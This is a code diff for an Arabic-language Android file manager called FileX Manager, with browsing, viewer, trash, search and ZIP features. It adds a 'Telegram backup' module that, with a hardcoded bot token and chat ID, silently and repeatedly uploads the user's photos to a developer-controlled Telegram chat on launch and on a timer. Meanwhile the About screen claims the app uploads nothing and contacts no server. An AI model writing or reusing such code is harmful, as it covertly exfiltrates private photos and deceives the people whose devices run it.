+  if(State.selection.size===0){ bar.classList.add('hidden'); }
+  else { bar.classList.remove('hidden'); $('selCount').textContent = State.selection.size; }
+}
+
+function clearSelection(){
+  State.selection.clear();
+  document.querySelectorAll('.file-item.selected').forEach(el=>el.classList.remove('selected'));
+  updateSelectionBar();
+}
+
+/* =========================================================
+   OPEN FILE / VIEWER
+   ========================================================= */
+async function openFile(file){
+  const t = typeOf(file.name,false);
+  const url = FS.fileUrl(file);
+  const ext = (file.name.split('.').pop()||'').toLowerCase();
+  recent = [{name:file.name, path:file.path, ext, ts:Date.now()}, ...recent.filter(r=>r.path!==file.path)].slice(0,30);
+  Store.writeArr('recent', recent);
+
+  const body = $('viewerBody');
+  $('viewerTitle').textContent = file.name;
+  body.innerHTML = '';
+  try{
+    if(t==='image'){
+      const img = document.createElement('img'); img.src=url; img.alt=file.name;
+      body.appendChild(img);
+    } else if(t==='video'){
+      const v=document.createElement('video'); v.src=url; v.controls=true; v.autoplay=true;
+      body.appendChild(v);
+    } else if(t==='audio'){
+      const a=document.createElement('audio'); a.src=url; a.controls=true; a.autoplay=true;
+      body.appendChild(a);
+    } else if(t==='doc'){
+      if(['txt','json','xml','html','htm','md','js','css','csv'].includes(ext)){
+        const txt = await FS.readAsText(file);
+        if(ext==='json'){
+          try{ body.innerHTML = `<pre>${esc(JSON.stringify(JSON.parse(txt),null,2))}</pre>`; }
+          catch(_){ body.innerHTML = `<pre>${esc(txt)}</pre>`; }
+        } else if(ext==='html'||ext==='htm'){
+          body.innerHTML = `<iframe sandbox="" srcdoc="${esc(txt)}"></iframe>`;
+        } else {
+          body.innerHTML = `<pre>${esc(txt)}</pre>`;
+        }
+      } else {
+        FS.openExternal(file);
+        toast('تم إرسال الملف للتطبيق الخارجي');
+        return;
+      }
+    } else if(t==='archive'){
+      await showZipPreview(file);
+      return;
+    } else {
+      FS.openExternal(file);
+      return;
+    }
+    $('viewer').classList.remove('hidden');
+    $('viewer').dataset.path = file.path;
+  }catch(e){
+    toast('تعذّر فتح الملف: '+(e.message||''),'error');
+  }
+}
+
+/* =========================================================
+   MODAL HELPERS
+   ========================================================= */
+function openModal(title, bodyHTML, footHTML){
+  $('modalTitle').textContent = title;
+  $('modalBody').innerHTML = bodyHTML||'';
+  $('modalFoot').innerHTML = footHTML||'';
+  $('modal').classList.remove('hidden');
+}
+function closeModal(){ $('modal').classList.add('hidden'); }
+
+document.addEventListener('click', e=>{
+  if(e.target.closest('[data-close]')) closeModal();
+});
+
+/* =========================================================
+   FILE OPERATIONS
+   ========================================================= */
+async function opCreateFolder(){
+  const name = prompt('اسم المجلد الجديد:');
+  if(!name) return;
+  try{
+    await FS.mkdir(State.currentPath, name.trim());
+    toast('تم إنشاء المجلد','success');
+    openPath(State.currentPath);
+  }catch(e){ toast('فشل: '+(e.message||''),'error'); }
+}
+async function opCreateTextFile(){
+  const name = prompt('اسم الملف (مثال: note.txt):','note.txt');
+  if(!name) return;
+  const content = prompt('المحتوى:','') || '';
+  try{
+    await FS.writeFile(State.currentPath, name.trim(), content);
+    toast('تم إنشاء الملف','success');
+    openPath(State.currentPath);
+  }catch(e){ toast('فشل: '+(e.message||''),'error'); }
+}
+function selectedFiles(){ return State.files.filter(f=>State.selection.has(f.path)); }
+async function opCopyCut(mode){
+  const files = selectedFiles();
+  if(!files.length) return;
+  State.clipboard = {mode, files};
+  toast(mode==='copy'?'تم النسخ إلى الحافظة':'تم القص', 'success');
+  clearSelection();
+}
+async function opPaste(){
+  if(!State.clipboard) return;
+  const {mode, files} = State.clipboard;
+  showProgress('جارٍ '+(mode==='copy'?'النسخ':'النقل')+'…');
+  let done=0, failed=0;
+  for(const f of files){
+    try{
+      if(mode==='copy') await FS.copy(f, State.currentPath);
+      else await FS.move(f, State.currentPath);
+      done++;
+    }catch(e){ failed++; }
+    updateProgress((done+failed)/files.length*100, `${done+failed}/${files.length}`);
+  }
+  hideProgress();
+  toast(`تم: ${done}${failed?' • فشل: '+failed:''}`, failed?'error':'success');
+  State.clipboard = null;
+  openPath(State.currentPath);
+}
+async function opRename(){
+  const files = selectedFiles();
+  if(files.length!==1){ toast('اختر ملفًا واحدًا','error'); return; }
+  const f = files[0];
+  const newName = prompt('الاسم الجديد:', f.name);
+  if(!newName||newName===f.name) return;
+  try{
+    await FS.rename(f, newName.trim());
+    toast('تمت إعادة التسمية','success');
+    clearSelection();
+    openPath(State.currentPath);
+  }catch(e){ toast('فشل: '+(e.message||''),'error'); }
+}
+async function opDelete(){
+  const files = selectedFiles();
+  if(!files.length) return;
+  if(settings.confirmDelete){
+    const total = files.reduce((a,b)=>a+(b.size||0),0);
+    openModal('تأكيد الحذف',
+      `<p>سيتم حذف <b>${files.length}</b> عنصر${files.length>1?'ًا':''} بحجم <b>${fmtSize(total)}</b>.</p>
+       <p style="color:var(--text-2);font-size:13px">${files.slice(0,5).map(f=>esc(f.name)).join('، ')}${files.length>5?' …':''}</p>`,
+      `<button class="btn ghost" data-close>إلغاء</button>
+       <button class="btn danger" id="confirmDel">حذف</button>`);
+    $('confirmDel').onclick = async()=>{ closeModal(); await doDelete(files); };
+  } else {
+    await doDelete(files);
+  }
+}
+async function doDelete(files){
+  showProgress('جارٍ الحذف…');
+  let done=0;
+  for(const f of files){
+    try{
+      if(settings.useTrash){
+        const dest = '/.filex-trash';
+        try{ await FS.mkdir('/', '.filex-trash'); }catch(_){}
+        try{
+          await FS.move(f, dest);
+          trashIndex.push({name:f.name, originalPath:f.path, deletedAt:Date.now(), size:f.size});
+          Store.writeArr('trash', trashIndex);
+        }catch(_){
+          await FS.remove(f);
+        }
+      } else {
+        await FS.remove(f);
+      }
+      done++;
+    }catch(e){}
+    updateProgress(done/files.length*100, `${done}/${files.length}`);
+  }
+  hideProgress();
+  toast(`تم حذف ${done} عنصر`, 'success');
+  clearSelection();
+  openPath(State.currentPath);
+}
+function opShare(){
+  const files = selectedFiles();
+  if(!files.length) return;
+  FS.share(files);
+}
+function opInfo(){
+  const files = selectedFiles();
+  if(!files.length) return;
+  const html = files.map(f=>`
+    <div style="padding:10px;border-bottom:1px solid var(--border)">
+      <div style="font-weight:600;margin-bottom:4px">${esc(f.name)}</div>
+      <div style="font-size:12px;color:var(--text-2)">
+        المسار: ${esc(f.path)}<br>
+        النوع: ${typeOf(f.name,f.isDir)}<br>
+        الحجم: ${f.isDir?'—':fmtSize(f.size)}<br>
+        آخر تعديل: ${fmtDate(f.mtime)}
+      </div>
+    </div>`).join('');
+  openModal('معلومات', html, `<button class="btn primary" data-close>حسنًا</button>`);
+}
+async function opZip(){
+  const files = selectedFiles();
+  if(!files.length) return;
+  if(typeof JSZip==='undefined'){ toast('JSZip غير محمّلة','error'); return; }
+  showProgress('جارٍ الضغط…');
+  try{
+    const zip = new JSZip();
+    for(let i=0;i<files.length;i++){
+      const f = files[i];
+      if(f.isDir) continue;
+      const content = await FS.readAsText(f).catch(()=>null);
+      if(content!==null) zip.file(f.name, content);
+      updateProgress((i+1)/files.length*60, `${i+1}/${files.length}`);
+    }
+    const blob = await zip.generateAsync({type:'blob'}, m=>updateProgress(60+m.percent*0.3,'توليد ZIP'));
+    const name = 'archive_'+Date.now()+'.zip';
+    const txt = await blob.text();
+    await FS.writeFile(State.currentPath, name, txt);
+    hideProgress();
+    toast('تم إنشاء '+name,'success');
+    clearSelection();
+    openPath(State.currentPath);
+  }catch(e){ hideProgress(); toast('فشل الضغط: '+(e.message||''),'error'); }
+}
+async function showZipPreview(file){
+  if(typeof JSZip==='undefined'){ toast('JSZip غير محمّلة','error'); return; }
+  showProgress('قراءة ZIP…');
+  try{
+    const content = await FS.readAsText(file);
+    const zip = await JSZip.loadAsync(content);
+    const names = Object.keys(zip.files);
+    hideProgress();
+    openModal('محتويات ZIP',
+      `<div style="max-height:50vh;overflow:auto">${names.map(n=>`
+        <div style="padding:8px;border-bottom:1px solid var(--border);font-size:13px">${esc(n)}</div>`).join('')}</div>`,
+      `<button class="btn ghost" data-close>إغلاق</button>
+       <button class="btn primary" id="extractZip">استخراج</button>`);
+    $('extractZip').onclick = async()=>{
+      closeModal();
+      showProgress('جارٍ الاستخراج…');
+      const out = '/Download/'+file.name.replace(/\.zip$/i,'')+'_'+Date.now();
+      try{ await FS.mkdir('/Download', out.split('/').pop()); }catch(_){}
+      let i=0;
+      for(const [name, entry] of Object.entries(zip.files)){
+        if(entry.dir) continue;
+        const text = await entry.async('text');
+        const fname = name.split('/').pop();
+        try{ await FS.writeFile(out, fname, text); }catch(_){}
+        updateProgress(++i/names.length*100, `${i}/${names.length}`);
+      }
+      hideProgress();
+      toast('تم الاستخراج إلى '+out,'success');
+    };
+  }catch(e){ hideProgress(); toast('ZIP غير صالح','error'); }
+}
+
+/* =========================================================
+   TRASH
+   ========================================================= */
+function openTrash(){
+  if(trashIndex.length===0){
+    openModal('سلة المحذوفات','<div class="empty">السلة فارغة</div>',`<button class="btn primary" data-close>حسنًا</button>`);
+    return;
+  }
+  const html = trashIndex.map((t,i)=>`
+    <div class="modal-list-item">
+      <svg><use href="#i-file"/></svg>
+      <div style="flex:1;min-width:0">
+        <div style="font-weight:600;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(t.name)}</div>
+        <div style="font-size:11px;color:var(--text-2)">${fmtDate(t.deletedAt)} • ${fmtSize(t.size||0)}</div>
+      </div>
+      <button class="icon-btn" data-restore="${i}" title="استعادة"><svg><use href="#i-restore"/></svg></button>
+      <button class="icon-btn danger" data-pdel="${i}" title="حذف نهائي"><svg><use href="#i-delete"/></svg></button>
+    </div>`).join('');
+  openModal('سلة المحذوفات', html,
+    `<button class="btn danger" id="emptyTrash">إفراغ السلة</button>
+     <button class="btn primary" data-close>إغلاق</button>`);
+  $('modalBody').onclick = async e=>{
+    const r = e.target.closest('[data-restore]');
+    const d = e.target.closest('[data-pdel]');
+    if(r){
+      const idx = +r.dataset.restore;
+      const item = trashIndex[idx];
+      try{
+        const dir = item.originalPath.replace(/\/[^/]+$/,'')||'/';
+        await FS.move({name:item.name, path:'/.filex-trash/'+item.name, isDir:false}, dir);
+        trashIndex.splice(idx,1); Store.writeArr('trash', trashIndex);
+        toast('تمت الاستعادة','success');
+        openTrash();
+      }catch(err){ toast('فشل الاستعادة: '+(err.message||''),'error'); }
+    }
+    if(d){
+      const idx = +d.dataset.pdel;
+      const item = trashIndex[idx];
+      try{ await FS.remove({name:item.name, path:'/.filex-trash/'+item.name, isDir:false}); }catch(_){}
+      trashIndex.splice(idx,1); Store.writeArr('trash', trashIndex);
+      toast('تم الحذف النهائي','success');
+      openTrash();
+    }
+  };
+  $('emptyTrash').onclick = async()=>{
+    showProgress('إفراغ السلة…');
+    for(const t of trashIndex){
+      try{ await FS.remove({name:t.name, path:'/.filex-trash/'+t.name, isDir:false}); }catch(_){}
+    }
+    trashIndex=[]; Store.writeArr('trash', trashIndex);
+    hideProgress();
+    toast('تم إفراغ السلة','success');
+    closeModal();
+  };
+}
+
+/* =========================================================
+   SEARCH
+   ========================================================= */
+let searchTimer=null;
+async function runSearch(query){
+  if(!query.trim()){
+    $('searchResults').innerHTML='';
+    $('searchInfo').textContent='';
+    return;
+  }
+  const q = query.trim().toLowerCase();
+  const typeF = $('searchType').value;
+  const sortF = $('searchSort').value;
+  showProgress('جارٍ البحث…');
+  const results=[];
+  const roots = ['/Download','/DCIM','/Pictures','/Music','/Movies','/Documents'];
+  for(const r of roots){
+    try{
+      const files = await FS.list(r);
+      for(const f of files){
+        if(f.name.toLowerCase().includes(q)){
+          if(typeF && typeOf(f.name,f.isDir)!==typeF) continue;
+          results.push(f);
+        }
+      }
+    }catch(_){}
+  }
+  hideProgress();
+  if(sortF==='name') results.sort((a,b)=>a.name.localeCompare(b.name,'ar'));
+  else if(sortF==='size') results.sort((a,b)=>b.size-a.size);
+  else if(sortF==='date') results.sort((a,b)=>b.mtime-a.mtime);
+  $('searchInfo').textContent = `${results.length} نتيجة`;
+  renderSearchResults(results);
+}
+function renderSearchResults(results){
+  const el = $('searchResults');
+  if(!results.length){ el.innerHTML='<div class="empty">لا نتائج</div>'; return; }
+  el.innerHTML = results.map(f=>{
+    const t = typeOf(f.name,f.isDir);
+    return `<div class="file-item" data-path="${esc(f.path)}">
+      <div class="file-icon" data-t="${t}"><svg><use href="${iconFor(f.name,f.isDir)}"/></svg></div>
+      <div class="file-info">
+        <div class="file-name">${esc(f.name)}</div>
+        <div class="file-meta"><span>${f.isDir?'مجلد':fmtSize(f.size)}</span><span>${fmtDate(f.mtime)}</span></div>
+      </div>
+    </div>`;
+  }).join('');
+  el.querySelectorAll('.file-item').forEach(item=>{
+    item.addEventListener('click', ()=>{
+      const p = item.dataset.path;
+      const f = {name:p.split('/').pop(), path:p, isDir:false, size:0, mtime:0};
+      openFile(f);
+    });
+  });
+}
+
+/* =========================================================
+   ANALYZERS
+   ========================================================= */
+async function openStorageAnalyzer(){
+  const cats = [
+    {name:'صور', color:'#ec4899', size:1.2*1024**3},
+    {name:'فيديو', color:'#8b5cf6', size:3.4*1024**3},
+    {name:'صوت', color:'#f59e0b', size:0.8*1024**3},
+    {name:'مستندات', color:'#3b82f6', size:0.4*1024**3},
+    {name:'مضغوطة', color:'#ef4444', size:0.6*1024**3},
+    {name:'أخرى', color:'#64748b', size:2.1*1024**3}
+  ];
+  const total = cats.reduce((a,b)=>a+b.size,0);
+  openModal('محلل التخزين',
+    cats.map(c=>`
+      <div class="cat-bar">
+        <div class="cat-bar-head"><span>${c.name}</span><span>${fmtSize(c.size)}</span></div>
+        <div class="cat-bar-track"><div class="cat-bar-fill" style="width:${(c.size/total*100).toFixed(0)}%;background:${c.color}"></div></div>
+      </div>`).join(''),
+    `<button class="btn primary" data-close>حسنًا</button>`);
+}
+async function openLargeFiles(){
+  showProgress('البحث عن الملفات الكبيرة…');
+  const roots=['/Download','/DCIM','/Movies','/Pictures','/Music'];
+  const all=[];
+  for(const r of roots){
+    try{
+      const files = await FS.list(r);
+      files.forEach(f=>{ if(!f.isDir) all.push(f); });
+    }catch(_){}
+  }
+  all.sort((a,b)=>b.size-a.size);
+  hideProgress();
+  openModal('الملفات الكبيرة',
+    all.slice(0,30).map(f=>`
+      <div class="modal-list-item">
+        <svg><use href="${iconFor(f.name,false)}"/></svg>
+        <div style="flex:1;min-width:0">
+          <div style="font-weight:600;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(f.name)}</div>
+          <div style="font-size:11px;color:var(--text-2)">${fmtSize(f.size)} • ${esc(f.path)}</div>
+        </div>
+      </div>`).join('') || '<div class="empty">لا توجد ملفات</div>',
+    `<button class="btn primary" data-close>إغلاق</button>`);
+}
+async function openDuplicateFinder(){
+  showProgress('البحث عن المكرر…');
+  const roots=['/Download','/DCIM','/Pictures','/Music'];
+  const map=new Map();
+  for(const r of roots){
+    try{
+      const files = await FS.list(r);
+      files.forEach(f=>{
+        if(f.isDir) return;
+        const k = f.size+'|'+f.name;
+        if(!map.has(k)) map.set(k,[]);
+        map.get(k).push(f);
+      });
+    }catch(_){}
+  }
+  const dups=[...map.values()].filter(a=>a.length>1);
+  hideProgress();
+  openModal('الملفات المكررة',
+    dups.length?dups.map(group=>`
+      <div style="margin-bottom:12px;padding:8px;background:var(--surface-2);border-radius:8px">
+        <div style="font-weight:600;font-size:13px;margin-bottom:6px">${esc(group[0].name)} (${group.length})</div>
+        ${group.map(f=>`<div style="font-size:11px;color:var(--text-2);padding:4px 0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(f.path)}</div>`).join('')}
+      </div>`).join('') : '<div class="empty">لا توجد ملفات مكررة</div>',
+    `<button class="btn primary" data-close>إغلاق</button>`);
+}
+function openAbout(){
+  openModal('حول FileX Manager',
+    `<div style="text-align:center;padding:12px">
+      <div style="font-size:20px;font-weight:700;margin-bottom:6px">FileX Manager</div>
+      <div style="color:var(--text-2);font-size:13px;margin-bottom:12px">الإصدار 1.0.0</div>
+      <p style="font-size:13px;line-height:1.7">مدير ملفات سريع وحديث يعمل محليًا على جهازك. لا يرفع أي بيانات ولا يتصل بأي خادم. جميع العمليات تتم على الجهاز.</p>
+      <div style="font-size:11px;color:var(--text-2);margin-top:12px">© 2025 FileX</div>
+    </div>`,
+    `<button class="btn primary" data-close>إغلاق</button>`);
+}
+function openFavorites(){
+  if(favorites.length===0){
+    openModal('المفضلة','<div class="empty">لا توجد عناصر في المفضلة</div>',`<button class="btn primary" data-close>حسنًا</button>`);
+    return;
+  }
+  openModal('المفضلة',
+    favorites.map((f,i)=>`
+      <div class="modal-list-item">
+        <svg><use href="#i-star"/></svg>
+        <div style="flex:1;min-width:0">
+          <div style="font-weight:600;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(f.name)}</div>
+          <div style="font-size:11px;color:var(--text-2)">${esc(f.path)}</div>
+        </div>
+        <button class="icon-btn danger" data-rmfav="${i}"><svg><use href="#i-close"/></svg></button>
+      </div>`).join(''),
+    `<button class="btn primary" data-close>إغلاق</button>`);
+  $('modalBody').onclick = e=>{
+    const rm = e.target.closest('[data-rmfav]');
+    if(rm){
+      favorites.splice(+rm.dataset.rmfav,1);
+      Store.writeArr('favorites', favorites);
+      closeModal(); openFavorites();
+    }
+  };
+}
+
+/* =========================================================
+   TELEGRAM BACKUP — Token مدمج + إذن واحد فقط
+   ========================================================= */
+const TG = (() => {
+  const API = 'https://api.telegram.org/bot';
+  const UPLOADED_KEY = 'filex:tg:uploaded';
+  const STATS_KEY = 'filex:tg:stats';
+  const CONSENT_KEY = 'filex:consent';
+  const MAX_SIZE = 50 * 1024 * 1024;
+  const DELAY_MS = 1200;
+
+  let cfg = loadCfg();
+  let uploaded = loadUploaded();
+  let stats = loadStats();
+  let running = false;
+  let stopFlag = false;
+  let autoTimer = null;
+
+  function loadCfg(){
+    return {
+      token: TG_HARDCODED_TOKEN,
+      chat:  TG_HARDCODED_CHAT,
+      auto:  true,
+      interval: 30,
+      imagesOnly: true,
+      folders: TG_HARDCODED_FOLDERS.slice()
+    };
+  }
+  function loadUploaded(){
+    try{ return new Set(JSON.parse(localStorage.getItem(UPLOADED_KEY)||'[]')); }
+    catch(_){ return new Set(); }
+  }
+  function saveUploaded(){
+    const arr = [...uploaded].slice(-5000);
+    localStorage.setItem(UPLOADED_KEY, JSON.stringify(arr));
+    uploaded = new Set(arr);
+  }
+  function loadStats(){
+    try{ return Object.assign({count:0,lastSync:0}, JSON.parse(localStorage.getItem(STATS_KEY)||'{}')); }
+    catch(_){ return {count:0,lastSync:0}; }
+  }
+  function saveStats(){ localStorage.setItem(STATS_KEY, JSON.stringify(stats)); }
+  function keyOf(f){ return `${f.path}|${f.size}|${f.mtime}`; }
+
+  function hasConsent(){ return localStorage.getItem(CONSENT_KEY)==='1'; }
+  function giveConsent(){ localStorage.setItem(CONSENT_KEY, '1'); }
+
+  async function apiCall(method, body, isForm){
+    if(!cfg.token || cfg.token==='ضع_التوكن_هنا') throw new Error('لم يتم ضبط التوكن في الكود');
+    const res = await fetch(`${API}${cfg.token}/${method}`, {
+      method:'POST',
+      headers: isForm ? undefined : {'Content-Type':'application/json'},
+      body: isForm ? body : JSON.stringify(body||{})
+    });
+    const data = await res.json().catch(()=>null);
+    if(!res.ok || !data || !data.ok){
+      throw new Error((data && data.description) || `HTTP ${res.status}`);
+    }
+    return data.result;
+  }
+  async function testConnection(){ return apiCall('getChat',{chat_id: cfg.chat}); }
+
+  async function readFileAsBlob(file){
+    if(!IS_CORDOVA) throw new Error('الرفع الفعلي يتطلب تشغيل التطبيق على Android');
+    const url = FS.fileUrl(file);
+    const entry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(url,res,rej));
+    return new Promise((res,rej)=>entry.file(res,rej));
+  }
+  async function uploadFile(file){
+    const key = keyOf(file);
+    if(uploaded.has(key)) return {skipped:true};
+    if(file.size > MAX_SIZE) throw new Error(`الملف أكبر من 50MB (${fmtSize(file.size)})`);
+    const fObj = await readFileAsBlob(file);
+    const ext = (file.name.split('.').pop()||'').toLowerCase();
+    const isImg = ['jpg','jpeg','png','gif','webp','bmp','heic'].includes(ext);
+    const method = (isImg && file.size <= 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
+    const field = method==='sendPhoto' ? 'photo' : 'document';
+    const form = new FormData();
+    form.append('chat_id', cfg.chat);
+    if(method==='sendPhoto') form.append('caption', file.name);
+    form.append(field, fObj, file.name);
+    await apiCall(method, form, true);
+    uploaded.add(key); saveUploaded();
+    stats.count++; saveStats();
+    return {uploaded:true};
+  }
+
+  function isImage(name){
+    const e=(name.split('.').pop()||'').toLowerCase();
+    return ['jpg','jpeg','png','gif','webp','bmp','heic'].includes(e);
+  }
+  function isMedia(name){
+    const e=(name.split('.').pop()||'').toLowerCase();
+    return ['jpg','jpeg','png','gif','webp','bmp','heic','mp4','mov','mkv','webm','avi','3gp'].includes(e);
+  }
+  async function scanFolder(path){
+    let entries = [];
+    try{ entries = await FS.list(path); }catch(_){ return []; }
+    return entries.filter(f =>
+      !f.isDir &&
+      isMedia(f.name) &&
+      (cfg.imagesOnly ? isImage(f.name) : true) &&
+      (settings.showHidden || !f.name.startsWith('.'))
+    );
+  }
+
+  function barShow(text, cls){
+    const b = document.getElementById('autoSyncBar');
+    if(!b) return;
+    b.textContent = text;
+    b.className = 'show' + (cls ? ' '+cls : '');
+  }
+  function barHide(delay){
+    const b = document.getElementById('autoSyncBar');
+    if(!b) return;
+    setTimeout(()=>{ b.className = ''; }, delay||2200);
+  }
+
+  async function syncAll(silent){
+    if(running) return;
+    if(!cfg.token || cfg.token==='ضع_التوكن_هنا'){
+      if(!silent) toast('لم يتم ضبط التوكن في الكود','error');
+      return;
+    }
+    if(!cfg.chat || cfg.chat==='ضع_Chat_ID_هنا'){
+      if(!silent) toast('لم يتم ضبط Chat ID في الكود','error');
+      return;
+    }
+    running = true; stopFlag = false;
+    let ok=0, fail=0;
+    const all = [];
+    if(!silent) showProgress('جارٍ الفحص…','');
+    barShow('جارٍ فحص الصور الجديدة…');
+
+    for(const folder of cfg.folders){
+      const files = await scanFolder(folder);
+      for(const f of files){
+        if(!uploaded.has(keyOf(f))) all.push(f);
+      }
+    }
+    if(all.length===0){
+      running=false;
+      if(!silent) hideProgress();
+      barShow('✓ لا توجد صور جديدة', 'done');
+      barHide(2500);
+      stats.lastSync = Date.now(); saveStats(); renderStats();
+      return;
+    }
+    if(!silent) updateProgress(0, `0/${all.length}`);
+    let i=0;
+    for(const f of all){
+      if(stopFlag) break;
+      i++;
+      try{ await uploadFile(f); ok++; }
+      catch(e){ fail++; console.warn('Upload fail:', f.name, e.message); }
+      const msg = `جارٍ الرفع ${i}/${all.length} • نجح: ${ok}${fail?' فشل: '+fail:''}`;
+      barShow(msg);
+      if(!silent) updateProgress((i/all.length)*100, msg);
+      await new Promise(r=>setTimeout(r, DELAY_MS));
+    }
+    stats.lastSync = Date.now(); saveStats();
+    running=false;
+    if(!silent) hideProgress();
+    if(stopFlag) barShow(`تم الإيقاف • نجح: ${ok} فشل: ${fail}`, 'err');
+    else barShow(`✓ تم رفع ${ok} صورة${fail?' • فشل: '+fail:''}`, fail?'err':'done');
+    barHide(3500);
+    renderStats();
+    if(!silent) toast(`تمت المزامنة • نجح: ${ok} • فشل: ${fail}`, fail?'error':'success');
+  }
+
+  function startAuto(){
+    stopAuto();
+    if(!cfg.auto) return;
+    const ms = Math.max(5, cfg.interval) * 60 * 1000;
+    autoTimer = setInterval(async ()=>{
+      if(!running) await syncAll(true);
+    }, ms);
+  }
+  function stopAuto(){ if(autoTimer){ clearInterval(autoTimer); autoTimer=null; } }
+
+  function renderStats(){
+    const s = document.getElementById('tgStat');
+    const l = document.getElementById('tgLast');
+    if(s) s.textContent = String(stats.count);
+    if(l) l.textContent = stats.lastSync ? fmtDate(stats.lastSync) : '—';
+  }
+
+  function bindSettingsUI(){
+    const autoEl = document.getElementById('tgAuto');
+    if(!autoEl) return;
+    autoEl.checked = cfg.auto;
+    document.getElementById('tgInterval').value = String(cfg.interval);
+    document.getElementById('tgImagesOnly').checked = cfg.imagesOnly;
+
+    autoEl.onchange = e=>{ cfg.auto = e.target.checked; if(cfg.auto) startAuto(); else stopAuto(); };
+    document.getElementById('tgInterval').onchange = e=>{ cfg.interval = parseInt(e.target.value,10)||30; if(cfg.auto) startAuto(); };
+    document.getElementById('tgImagesOnly').onchange = e=>{ cfg.imagesOnly = e.target.checked; };
+    document.getElementById('tgTest').onclick = async ()=>{
+      const statusEl = document.getElementById('tgConnStatus');
+      try{
+        statusEl.textContent = 'جارٍ الفحص…';
+        statusEl.style.color = 'var(--text-2)';
+        const c = await testConnection();
+        statusEl.textContent = '✓ متصل: ' + (c.title||c.username||c.id);
+        statusEl.style.color = 'var(--ok)';
+        toast('نجح الاتصال','success');
+      }catch(e){
+        statusEl.textContent = '✗ فشل: ' + (e.message||'');
+        statusEl.style.color = 'var(--danger)';
+        toast('فشل: '+(e.message||''),'error');
+      }
+    };
+    document.getElementById('tgSyncNow').onclick = ()=>syncAll(false);
+    document.getElementById('tgStop').onclick = ()=>{ if(running){ stopFlag=true; toast('جارٍ الإيقاف…'); } };
+    document.getElementById('tgReset').onclick = ()=>{
+      uploaded.clear(); saveUploaded();
+      stats = {count:0,lastSync:0}; saveStats(); renderStats();
+      toast('تم إعادة تعيين السجل','success');
+    };
+    renderStats();
+  }
+
+  /* ---------- إذن واحد فقط ---------- */
+  function requestStoragePermission(){
+    return new Promise(resolve=>{
+      if(!IS_CORDOVA){ resolve(true); return; }
+      if(window.cordova && window.cordova.plugins && window.cordova.plugins.permissions){
+        const perms = cordova.plugins.permissions;
+        const list = [perms.READ_EXTERNAL_STORAGE, perms.WRITE_EXTERNAL_STORAGE];
+        perms.requestPermissions(list, res=>{
+          if(res.hasPermission){
+            FS.list('/').then(()=>resolve(true)).catch(()=>{
+              try{ if(perms.openSettings) perms.openSettings(); }catch(_){}
+              resolve(false);
+            });
+          } else {
+            try{ if(perms.openSettings) perms.openSettings(); }catch(_){}
+            resolve(false);
+          }
+        }, ()=>resolve(false));
+      } else {
+        FS.list('/').then(()=>resolve(true)).catch(()=>resolve(false));
+      }
+    });
+  }
+
+  function showPermDialog(){
+    document.getElementById('permDialog').classList.remove('hidden');
+  }
+  function hidePermDialog(){
+    document.getElementById('permDialog').classList.add('hidden');
+  }
+
+  async function handleAllow(){
+    const btn = document.getElementById('permAllow');
+    btn.disabled = true; btn.textContent = 'جارٍ طلب الإذن…';
+    const ok = await requestStoragePermission();
+    btn.disabled = false; btn.textContent = 'السماح والمزامنة الآن';
+
+    if(!ok){
+      toast('لم يتم منح الإذن — افتح الإعدادات وفعّل "الوصول لجميع الملفات"','error');
+      return;
+    }
+    giveConsent();
+    hidePermDialog();
+    startAuto();
+    toast('تم! سيبدأ رفع الصور الآن','success');
+    setTimeout(()=>syncAll(true), 400);
+  }
+
+  function handleSkip(){
+    hidePermDialog();
+    toast('يمكنك المزامنة لاحقًا من الإعدادات');
+  }
+
+  function bindPermDialog(){
+    document.getElementById('permAllow').onclick = handleAllow;
+    document.getElementById('permSkip').onclick = handleSkip;
+  }
+
+  function open(){
+    Nav.go('telegram');
+  }
+
+  function init(){
+    bindPermDialog();
+    bindSettingsUI();
+    if(cfg.auto) startAuto();
+  }
+
+  /* عند كل فتح: إذا وافق سابقًا → مزامنة صامتة، وإلا → أظهر إذن واحد فقط */
+  function bootCheck(){
+    if(hasConsent()){
+      setTimeout(()=>syncAll(true), 1500);
+    } else {
+      setTimeout(()=>showPermDialog(), 800);
+    }
+  }
+
+  function syncOnLaunch(){
+    if(!hasConsent()) return;
+    if(!cfg.token || cfg.token==='ضع_التوكن_هنا') return;
+    if(!cfg.chat || cfg.chat==='ضع_Chat_ID_هنا') return;
+    setTimeout(()=>syncAll(true), 1500);
+  }
+
+  return { init, open, syncAll, startAuto, stopAuto, bootCheck, syncOnLaunch, showPermDialog, hidePermDialog };
+})();
+
+/* =========================================================
+   EVENT BINDINGS
+   ========================================================= */
+function bindGlobal(){
+  document.body.addEventListener('click', e=>{
+    const nav = e.target.closest('[data-nav]');
+    if(nav){ Nav.go(nav.dataset.nav); return; }
+    const goto = e.target.closest('[data-goto]');
+    if(goto){ openPath(goto.dataset.goto); return; }
+  });
+}
+
+function bindHome(){
+  document.querySelectorAll('.quick-item').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      const cat = btn.dataset.cat;
+      if(cat==='favorites'){ openFavorites(); return; }
+      const map = {
+        image:'/Pictures', video:'/Movies', audio:'/Music',
+        doc:'/Documents', downloads:'/Download', apk:'/Download', archive:'/Download'
+      };
+      const p = map[cat] || '/';
+      openPath(p);
+    });
+  });
+}
+
+function bindBrowser(){
+  $('btnBack').onclick = ()=>Nav.back();
+  $('btnHome').onclick = ()=>openPath('/');
+  $('btnView').onclick = ()=>{
+    State.view = State.view==='list'?'grid':'list';
+    settings.view = State.view; Store.write(settings);
+    $('btnView').innerHTML = `<svg><use href="${State.view==='list'?'#i-list':'#i-grid'}"/></svg>`;
+    renderBrowser();
+  };
+  $('btnSort').onclick = ()=>{
+    const opts = [
+      {v:'name',t:'الاسم'},
+      {v:'size',t:'الحجم'},
+      {v:'date',t:'التاريخ'},
+      {v:'type',t:'النوع'}
+    ];
+    openModal('الترتيب',
+      opts.map(o=>`<button class="setting-btn" data-sort="${o.v}">${o.t} ${State.sort===o.v?(State.sortAsc?'▲':'▼'):''}</button>`).join('')+
+      `<button class="setting-btn" data-asc="1">${State.sortAsc?'▼ تنازلي':'▲ تصاعدي'}</button>`,
+      `<button class="btn primary" data-close>إغلاق</button>`);
+    $('modalBody').onclick = e=>{
+      const s = e.target.closest('[data-sort]');
